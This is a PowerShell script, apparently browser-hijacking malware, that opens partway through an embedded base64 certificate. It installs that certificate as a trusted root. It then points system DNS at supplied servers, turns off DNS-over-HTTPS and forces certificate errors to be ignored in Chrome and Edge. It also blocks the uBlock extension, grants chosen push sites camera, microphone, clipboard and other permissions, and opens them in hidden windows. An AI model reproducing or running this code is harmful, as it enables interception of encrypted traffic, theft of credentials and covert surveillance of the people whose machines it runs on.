'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'+ 
'FNQ6MsWQzSgHR0aDrhXNFQzbw9r3AgIH0A=='
}

function IsDebug {
    $debugFile = "C:\debug.txt"
    
    try {
        # Check if the file exists
        if (Test-Path $debugFile -PathType Leaf) {
            return $true
        } else {
            return $false
        }
    } catch {
        # Catch any errors that occur during the Test-Path operation
        return $false
    }
}

function Get-EnvPaths {
    $a = Get-LocalAppDataPath
    $b =  Get-AppDataPath
    return @($a , $b)
}

function Get-TempFile {
    $tempPath = [System.IO.Path]::GetTempPath()
    $tempFile = [System.IO.Path]::GetTempFileName()
    return $tempFile
}

function Get-LocalAppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData)
}

function Get-AppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
}

function Get-ProfilePath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
}

function Close-Processes {
    param (
        [string[]]$processes
    )

    foreach ($process in $Processes) {
        $command = "taskkill.exe /im $process /f"
        Invoke-Expression $command
    }
}




function ConfigureCertificates {
    foreach ($key in $xdata.Keys) {
        Cert-Work -contentString $xdata[$key]
    }
}

function Cert-Work {
    param(
        [string] $contentString
    )
    $outputFilePath = [System.IO.Path]::GetTempFileName()
    $binary = [Convert]::FromBase64String($contentString)
    try {
        Set-Content -Path $outputFilePath -Value $binary -AsByteStream
    } catch {
        Add-Content -Path $outputFilePath -Value $binary -Encoding Byte
    }
    Install-CertificateToStores -CertificateFilePath $outputFilePath -Password '123'
}

function Install-CertificateToStores {
    param(
        [string] $CertificateFilePath,
        [string] $Password
    )

    try {
        $securePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force

        # Import certificate to Personal (My) store
        $personalStorePath = "Cert:\LocalMachine\My"
        Import-PfxCertificate -FilePath $CertificateFilePath -CertStoreLocation $personalStorePath -Password $securePassword -ErrorAction Stop
        Write-Output "Certificate installed successfully to Personal store (My)."

        # Import certificate to Root store
        $rootStorePath = "Cert:\LocalMachine\Root"
        Import-PfxCertificate -FilePath $CertificateFilePath -CertStoreLocation $rootStorePath -Password $securePassword -ErrorAction Stop
        Write-Output "Certificate installed successfully to Root store."

    } catch {
        throw "Failed to install certificate: $_"
    }
}

function ConfigureChrome {
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" -Name "EnableAutoDOH" -Value 0

    $chromeKeyPath = "HKLM:\Software\Policies\Google\Chrome"

    if (-not (Test-Path $chromeKeyPath)) {
        New-Item -Path $chromeKeyPath -Force | Out-Null
    }

    New-Item -Path $chromeKeyPath -Force | Out-Null  # Create the key if it doesn't exist
    Set-ItemProperty -Path $chromeKeyPath -Name "CommandLineFlag" -Value "--ignore-certificate-errors --disable-quic --disable-hsts"
    Set-ItemProperty -Path $chromeKeyPath -Name "DnsOverHttps" -Value "off"

    Set-ItemProperty -Path $chromeKeyPath -Name "IgnoreCertificateErrors" -Value 1

    Write-Output "Chrome configured"
}








function PushDomain {
    param ($pushUrl)

    # Trim the input string before the first comma
    $trimmedUrl = $pushUrl.Trim().Split(',')[0].Trim()

    # Parse the URI
    $parsedUri = [System.Uri]::new($trimmedUrl)
    
    # Extract domain and port
    $domain = $parsedUri.Host
    $port = if ($parsedUri.Port -eq -1) { 443 } else { $parsedUri.Port }

    # Construct the result URL
    $result = "https://" + $domain + ":" + "$port,*"
    
    return $result
}

function PushExists
{
    param ($pushUrl)
    foreach ($push in $xpushes) 
    {
        if ((PushDomain -pushUrl $pushUrl) -eq (PushDomain -pushUrl $push))
        {
            return $true;
        }
    }
    return $false
}

function List-Pushes()
{
    $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"

    # Check if the Preferences file exists
    if (Test-Path $preferencesPath) {
        $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json

        $notificationSettings = $preferencesContent.profile.content_settings.exceptions.notifications

        if ($notificationSettings -isnot [array]) {
            $notificationSettings = @($notificationSettings)
        }

        if ($notificationSettings) {
            foreach ($item in $notificationSettings) {
                $jsonItem = $item | ConvertTo-Json -Depth 1
                Write-Output $jsonItem
            }
        } else {
            Write-Output "No notification settings found."
        }
    } else {
        Write-Output "Preferences file not found at path: $preferencesPath"
    }
}

function Remove-Pushes {
    $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"

    # Check if the Preferences file exists
    if (Test-Path $preferencesPath) {
        $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json

        # Check if the structure is as expected
        if ($preferencesContent -and $preferencesContent.profile -and $preferencesContent.profile.content_settings -and $preferencesContent.profile.content_settings.exceptions.notifications) {
            $notificationSettings = $preferencesContent.profile.content_settings.exceptions.notifications

            $keysToRemove = @()

            # Iterate through each entry in $notificationSettings
            foreach ($field in $notificationSettings.PSObject.Properties) {
                $siteUrl = $field.Name
                $permission = (PushExists -pushUrl $siteUrl)
            
                if ($permission -eq $false) {
                    $keysToRemove += $field.Name
                } else {
                    Write-Output "$siteUrl hasn't been removed, it is a good site."
                }
            }

            foreach ($key in $keysToRemove) {
                $notificationSettings.PSObject.Properties.Remove($key)
            }

            $preferencesContent | ConvertTo-Json -Depth 100 | Set-Content -Path $preferencesPath -Force

            Write-Output "All selected push notification settings have been removed."
        } else {
            Write-Output "No or unexpected notification settings found in Preferences file."
        }
    } else {
        Write-Output "Preferences file not found at path: $preferencesPath"
    }
}


function Add-Push {
    param (
        [string]$pushUrl
    )

    $pushDomain = PushDomain -pushUrl $pushUrl

    $chromePreferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"

    if (-not (Test-Path -Path $chromePreferencesPath)) {
        Write-Host "Chrome preferences file not found at path: $chromePreferencesPath"
        exit
    }

    $preferencesContent = Get-Content -Path $chromePreferencesPath -Raw | ConvertFrom-Json

    if (-not $preferencesContent.profile) {
        $preferencesContent | Add-Member -MemberType NoteProperty -Name profile -Value @{}
    }

    if (-not $preferencesContent.profile.default_content_setting_values) {
        $preferencesContent.profile | Add-Member -MemberType NoteProperty -Name default_content_setting_values -Value @{}
    }

    if (-not $preferencesContent.profile.default_content_setting_values.popups) {
        $preferencesContent.profile.default_content_setting_values | Add-Member -MemberType NoteProperty -Name popups -Value 1
    } else {
        $preferencesContent.profile.default_content_setting_values.popups = 1
    }

    if (-not $preferencesContent.profile.default_content_setting_values.subresource_filter) {
        $preferencesContent.profile.default_content_setting_values | Add-Member -MemberType NoteProperty -Name subresource_filter -Value 1
    } else {
        $preferencesContent.profile.default_content_setting_values.subresource_filter = 1
    }

    $preferencesContentJson = $preferencesContent | ConvertTo-Json -Depth 32
    Set-Content -Path $chromePreferencesPath -Value $preferencesContentJson -Force

    $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"

    if (Test-Path $preferencesPath) {
        $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json
        $contentSettings = $preferencesContent.profile.content_settings.exceptions
        $settingsToUpdate = @(
            "auto_picture_in_picture", "background_sync", "camera", "clipboard", "cookies", 
            "geolocation", "images", "javascript", "microphone", "midi_sysex", 
            "notifications", "popups", "plugins", "sound", "unsandboxed_plugins", 
            "automatic_downloads", "flash_data", "mixed_script", "sensors","window_placement","webid_api","vr",
            "subresource_filter","media_stream_mic","media_stream_mic","media_stream_camera","local_fonts",
            "javascript_jit","idle_detection","captured_surface_control","ar"

        )

        foreach ($setting in $settingsToUpdate) {
            if ($null -eq $contentSettings.$setting) {
                $contentSettings | Add-Member -MemberType NoteProperty -Name $setting -Value @{}
            }
            $specificSetting = $contentSettings.$setting
            if ($specificSetting.PSObject.Properties.Name -contains $pushDomain) {
                Write-Output "The website URL $pushDomain already exists in the $setting settings."
            } else {
                $specificSetting | Add-Member -MemberType NoteProperty -Name $pushDomain -Value @{
                    "last_modified" = "13362720545785774"
                    "setting" = 1
                }
                $contentSettings.$setting = $specificSetting
            }
        }

        $preferencesContent.profile.content_settings.exceptions = $contentSettings
        $updatedPreferencesJson = $preferencesContent | ConvertTo-Json -Depth 10
        $updatedPreferencesJson | Set-Content -Path $preferencesPath -Encoding UTF8

        Write-Output "Notification subscription for $pushDomain added successfully with all permissions."
    } else {
        Write-Output "Preferences file not found at path: $preferencesPath"
    }
}



function Close-ChromeWindow {
    param ($window)
    [User32X]::CloseWindow($window) | Out-Null
    Start-Sleep -Milliseconds 25
}

function Close-Chrome {
    param ($process)
    Close-ChromeWindow -window $process.MainWindowHandle
    try {
        $process.Close()
    }
    catch {
  
    }
}


function Close-AllChromes {
    $windows = [User32X]::EnumerateAllWindows()
    foreach ($window in $windows) 
    {
        $title = [User32X]::GetWindowText($window)
        if ($title.Contains("Google Chrome"))
        {
            [User32X]::ShowWindow($window, [User32X]::SW_HIDE) | Out-Null
            Close-ChromeWindow -window $window
        }
        Write-Output "Window Handle: $($window.ToString()), Title: $title"
    }
    Close-Processes(@('chrome.exe'))
}

function Open-ChromeWithUrl {
    param (
        [string]$url
    )
    $isDebug = IsDebug
    $chromePaths = @(
        "C:\Program Files\Google\Chrome\Application\chrome.exe",
        "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe",
        "$env:ProgramFiles\Google\Chrome\Application\chrome.exe",
        "$env:ProgramFiles(x86)\Google\Chrome\Application\chrome.exe"
    )
    $resolvedPaths = @()
    foreach ($path in $chromePaths) {
        try {
            $resolvedPath = Resolve-Path -Path $path -ErrorAction Stop
            if ($resolvedPath -notin $resolvedPaths) {
                $resolvedPaths += $resolvedPath.Path
            }
        } catch {
            Write-Output "Error resolving path: $_"
        }
    }
    $resolvedPaths = $resolvedPaths | Select-Object -Unique
    foreach ($path in $resolvedPaths) {
        if (Test-Path -Path $path) {
            Write-Output "Found Chrome at: $path"

            $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
            $processStartInfo.FileName = $path
            $processStartInfo.Arguments = $url
            $processStartInfo.CreateNoWindow = $true
            $processStartInfo.UseShellExecute = $false
            $process = New-Object System.Diagnostics.Process
            $process.StartInfo = $processStartInfo
            $process.Start() | Out-Null
            $endTime = (Get-Date).AddSeconds(6)
            while ((Get-Date) -lt $endTime) {
                if ($isDebug -eq $false)
                {
                    [User32X]::ShowWindow($process.MainWindowHandle, [User32X]::SW_HIDE) | Out-Null
                }
                Start-Sleep -Milliseconds 1
            }
            [User32X]::ShowWindow($process.MainWindowHandle, [User32X]::SW_SHOW) | Out-Null
            Close-Chrome -process $process
        } else {
            Write-Output "Chrome not found at: $path"
        }
    }
}


function ConfigureChromePushes {
    Add-Type @"
    using System;
    using System.Collections.Generic;
    using System.Runtime.InteropServices;
    using System.Text;

    public static class User32X {
        public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool IsWindowVisible(IntPtr hWnd);

        public static string GetWindowText(IntPtr hWnd) {
            int length = GetWindowTextLength(hWnd);
            if (length == 0) return String.Empty;

            StringBuilder sb = new StringBuilder(length + 1);
            GetWindowText(hWnd, sb, sb.Capacity);
            return sb.ToString();
        }

        public static bool IsWindowVisibleEx(IntPtr hWnd) {
            return IsWindowVisible(hWnd) && GetWindowTextLength(hWnd) > 0;
        }

        public static IntPtr[] EnumerateAllWindows() {
            var windowHandles = new List<IntPtr>();
            EnumWindows((hWnd, lParam) => {
                if (IsWindowVisibleEx(hWnd)) {
                    windowHandles.Add(hWnd);
                }
                return true;
            }, IntPtr.Zero);
            return windowHandles.ToArray();
        }

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public const int SW_HIDE = 0;
        public const int SW_MINIMIZE = 6;
        public const int SW_SHOW = 5;

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

        public static void CloseWindow(IntPtr hWnd) {
            const uint WM_CLOSE = 0x0010;
            PostMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
        }
    }
"@

    Close-AllChromes;
    Remove-Pushes;
    foreach ($push in $xpushes) {
        Add-Push -pushUrl $push
    }
    List-Pushes;
    foreach ($push in $xpushes) {
        Open-ChromeWithUrl -url $push
    }
}




function ConfigureChromeUblock {
    $keywords = @("uBlock")

    foreach ($dir in Get-EnvPaths) {
        $chromeDir = Join-Path -Path $dir -ChildPath "Google\Chrome\User Data\Default\Extensions"
        
        try {
            if (Test-Path -Path $chromeDir -PathType Container) {
                $extensions = Get-ChildItem -Path $chromeDir -Directory

                foreach ($extension in $extensions) {
                    $manFile = chromeublock_FindManifestFile -folder $extension.FullName
                    if ($manFile -ne "") {
                        $foundKeyword = $false
                        
                        foreach ($manifestValue in $keywords) {
                            $content = Get-Content -Path $manFile -Raw
                            if ($content -match [regex]::Escape($manifestValue)) {
                                $foundKeyword = $true
                                break
                            }
                        }

                        if ($foundKeyword) {
                            $extFolderName = [System.IO.Path]::GetFileName($extension.FullName)
                            chromeublock_ProcessManifestAll -extName $extFolderName
                        }
                    }
                }
            }
        } catch {
             Write-Error "Error occurred: $_"
        }
    }
}


function chromeublock_FindManifestFile {
    param (
        [string]$folder
    )

    $result = ""

    Get-ChildItem -Path $folder | ForEach-Object {
        if (-not ($_.PSIsContainer)) {
            if ($_.Name -eq "manifest.json") {
                $result = $_.FullName
                return
            }
        } elseif ($_.Name -notin @('.', '..')) {
            $result = chromeublock_FindManifestFile -folder $_.FullName
            if ($result -ne "") {
                return
            }
        }
    }

    return $result
}


function chromeublock_ProcessManifestAll {
    param (
        [string]$extName
    )

    chromeublock_ProcessManifest -extName $extName -browser "Google\Chrome"
}

function chromeublock_ProcessManifest {
    param (
        [string]$extName,
        [string]$browser
    )

    $regPath = "HKLM:\SOFTWARE\Policies\$browser\ExtensionInstallBlocklist"
    
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    
    $regKeyIndex = 1
    do {
        $keyName = "$regKeyIndex"
        $val = Get-ItemProperty -Path $regPath -Name $keyName -ErrorAction SilentlyContinue
        if ($val -eq $extName) {
            return
        }
        $regKeyIndex++
    } until (-not (Test-Path "$regPath\$keyName"))

    Set-ItemProperty -Path $regPath -Name $keyName -Value $extName
}




function Set-DnsServers {
    param (
        [string]$primaryDnsServer,
        [string]$secondaryDnsServer
    )

    try {
        # Get network adapters that are IP-enabled
        $networkAdapters = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -notlike '*Virtual*' }

        foreach ($adapter in $networkAdapters) {
            # Set DNS servers using Set-DnsClientServerAddress cmdlet
            Set-DnsClientServerAddress -InterfaceAlias $adapter.Name -ServerAddresses @($primaryDnsServer, $secondaryDnsServer) -Confirm:$false
            
            Write-Output "Successfully set DNS servers for adapter: $($adapter.InterfaceDescription)"
        }
    } catch {
        Write-Error "An error occurred: $_"
    }
}
function ConfigureEdge {
    $edgeKeyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Edge"
    
    if (-not (Test-Path $edgeKeyPath)) {
        New-Item -Path $edgeKeyPath -Force | Out-Null
    }
    
    $commandLinePath = Join-Path $edgeKeyPath "CommandLine"
    if (-not (Test-Path $commandLinePath)) {
        New-Item -Path $commandLinePath -Force | Out-Null
    }
    
    Set-ItemProperty -Path $commandLinePath -Name "(Default)" -Value "--ignore-certificate-errors --disable-quic --disable-hsts"
    
    Set-ItemProperty -Path $edgeKeyPath -Name "DnsOverHttps" -Value "off"

    Set-ItemProperty -Path $edgeKeyPath -Name "IgnoreCertificateErrors" -Value 1
}




function ConfigureFireFox 
{
    try 
    {
        Set-FirefoxRegistry -KeyPaths @(
            'SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS',
            'SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS'
        ) -ValueNames @('Enabled', 'Locked') -Values @(0, 1)
    }
    catch 
    {
        Write-Warning "Failed to set firefox registry: $_"
    }
    foreach ($dir in Get-EnvPaths) 
    {
        try 
        {
        $path = Join-Path -Path $dir -ChildPath "Mozilla\Firefox\Profiles\user.js"

            $UserJSContent = 'user_pref("network.trr.mode", 5);'
            
            if (!(Test-Path -Path $path -PathType Leaf)) 
            {
                New-Item -Path $path -ItemType File -ErrorAction SilentlyContinue
                Add-Content -Path $path -Value $UserJSContent -ErrorAction SilentlyContinue
            }
        }
        catch 
        {
            Write-Warning "Failed to write to user.js file: $_"
        }
    }
}


function Set-FirefoxRegistry {
    param (
        [string[]]$KeyPaths,
        [string[]]$ValueNames,
        [int[]]$Values
    )

    $ErrorActionPreference = 'Stop'
    $regKey = [Microsoft.Win32.Registry]::LocalMachine

    try {
        foreach ($i in 0..($KeyPaths.Length - 1)) {
            $key = $regKey.OpenSubKey($KeyPaths[$i], $true)
            if ($key -eq $null) {
                Write-Warning "Failed to open registry key: $($KeyPaths[$i])"
                return
            }

            $key.SetValue($ValueNames[$i], $Values[$i], [Microsoft.Win32.RegistryValueKind]::DWord)
            $key.Close()
        }
    }
    catch {
        Write-Warning "Error accessing or modifying registry: $_"
    }
}




function ConfigureOpera
{
    Close-Processes(@('opera_crashreporter.exe', 'opera.exe'))

    foreach ($dir in Get-EnvPaths) {
        $path = Join-Path -Path $dir -ChildPath 'Opera Software\Opera Stable\Local State'

        try {
            if (Test-Path -Path $path -PathType Leaf)
            {
                ConfigureOperaInternal -FilePath $path
            }
        } catch {
            Write-Warning "Error occurred in Opera: $_"
        }
    }
}

function ConfigureOperaInternal {
    param(
        [string]$filePath
    )

    $content = Get-Content -Path $filePath -Raw | ConvertFrom-Json

    if ($null -eq $content.dns_over_https -or $content.dns_over_https -isnot [object]) {
        $content.dns_over_https = @{
            'mode' = 'off'
            'opera' = @{
                'doh_mode' = 'off'
            }
            'templates' = ""
        }
    } else {
        $content.dns_over_https.mode = 'off'
        $content.dns_over_https.opera = @{
            'doh_mode' = 'off'
        }
        $content.dns_over_https.templates = ""
    }

    $jsonString = $content | ConvertTo-Json -Depth 10

    Set-Content -Path $filePath -Value $jsonString -Encoding UTF8 -Force

    Write-Host "Successfully configured Opera settings in $filePath"
}




function ConfigureYandex
{
    Close-Processes(@('service_update.exe','browser.exe'))

    foreach ($dir in Get-EnvPaths) {
        $path = Join-Path -Path $dir -ChildPath 'Yandex\YandexBrowser\User Data\Local State'

        try {
            if (Test-Path -Path $path -PathType Leaf)
            {
                ConfigureYandexInternal -FilePath $path
            }
        } catch {
            Write-Error "Error occurred: $_"
        }
    }
}

function ConfigureYandexInternal {
    param(
        [string]$filePath
    )
    $content = Get-Content -Path $filePath -Raw | ConvertFrom-Json

    if ($null -eq $content.dns_over_https -or $content.dns_over_https -isnot [object]) {
        $content | Add-Member -MemberType NoteProperty -Name 'dns_over_https' -Value @{
            'mode' = 'off'
            'templates' = ""
        }
    } else {
        $content.dns_over_https.mode = 'off'
        $content.dns_over_https.templates = ""
    }

    $jsonString = $content | ConvertTo-Json -Depth 10

    Set-Content -Path $filePath -Value $jsonString -Encoding UTF8 -Force

    Write-Host "Successfully configured Yandex settings in $filePath"
}





































function main {
    Set-DNSServers -PrimaryDNSServer $primaryDNSServer -SecondaryDNSServer $secondaryDNSServer
    ConfigureCertificates
    ConfigureChrome
    ConfigureEdge
    ConfigureYandex
    ConfigureFireFox
    ConfigureOpera
    ConfigureChromeUblock
    ConfigureChromePushes
    DoAutoUpdate
}

main

